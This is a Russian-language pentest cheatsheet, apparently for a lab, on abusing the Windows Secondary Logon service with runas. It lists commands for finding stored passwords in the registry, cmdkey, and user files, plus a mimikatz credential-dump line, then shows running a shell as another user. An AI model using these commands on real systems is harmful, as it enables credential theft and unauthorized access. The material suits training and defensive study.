# 🔥 Cheatsheet: Secondary Logon (seclogon) + runas


## 📌 **Что это**

**Secondary Logon (seclogon)** — служба Windows, которая позволяет запускать процессы от имени другого пользователя.  
Это та же служба, которая используется командой `runas`.

Если эта служба **запущена** (а она запущена по умолчанию), и у тебя есть **пароль другого пользователя**, ты можешь выполнять команды от его имени.


## 🎯 **Когда это полезно**

- Ты нашел пароль пользователя в реестре, файлах, `cmdkey` или через `mimikatz`.
- Ты хочешь выполнить команду от имени этого пользователя (например, прочитать его файлы).
- Ты хочешь получить интерактивную сессию (cmd) от другого пользователя.


## 🔧 **Основные команды**

### 1. Запустить команду от имени другого пользователя

```cmd
runas /user:privesc\notadmin "cmd.exe"
```

### 2. Запустить команду и сохранить учётные данные (чтобы не вводить пароль повторно)

```cmd
runas /user:privesc\notadmin /savecred "cmd.exe"
```

### 3. Запустить команду с выводом в файл

```cmd
runas /user:privesc\notadmin "whoami > C:\Users\Public\whoami.txt"
```

### 4. Запустить интерактивную командную строку

```cmd
runas /user:privesc\notadmin "cmd.exe"
```


## 🔍 **Как найти пароль пользователя**

### 1. В реестре (Winlogon)

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### 2. В сохранённых учётных данных

```cmd
cmdkey /list
```

### 3. В файлах пользователя

```cmd
dir /s /b C:\Users\notadmin\*.txt
dir /s /b C:\Users\notadmin\*.config
dir /s /b C:\Users\notadmin\*.ini
```

### 4. В процессах

```cmd
tasklist /v | findstr notadmin
```

### 5. Через `mimikatz` (требует `SeDebugPrivilege`)

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```


## 🧠 **Пример эксплуатации**

### 1. Нашёл пароль в реестре:

```
DefaultPassword    REG_SZ    P@ssw0rd!
```

### 2. Проверил службу Secondary Logon:

```cmd
sc query seclogon
```
Вывод: `STATE: 4 RUNNING`

### 3. Запустил `runas`:

```cmd
runas /user:privesc\notadmin "cmd.exe"
```

### 4. Ввёл пароль и получил командную строку от `notadmin`.


## 🚨 **Почему это работает**

- `seclogon` — системная служба, которая всегда запущена.
- `runas` — встроенная утилита, которая использует эту службу.
- Если ты знаешь пароль пользователя — ты можешь запускать процессы от его имени.

---

## 📌 **Важно**

- `runas` не работает, если пользователь не имеет интерактивного входа.
- `runas` не работает, если политика запрещает запуск от имени другого пользователя.
- `runas /savecred` сохраняет пароль в `Credential Manager`, что может быть использовано позже.

---

## 🔥 **Бонус: подмена `seclogon` (если есть права на запись)**

Если у тебя есть права на запись в бинарник `seclogon` (обычно нет), ты можешь подменить его своим reverse shell. Но это требует прав `SYSTEM`.


## 📌 **Итог**

`runas` — это мощный инструмент, если ты знаешь пароль.  
Служба `seclogon` всегда запущена, поэтому `runas` работает практически всегда.
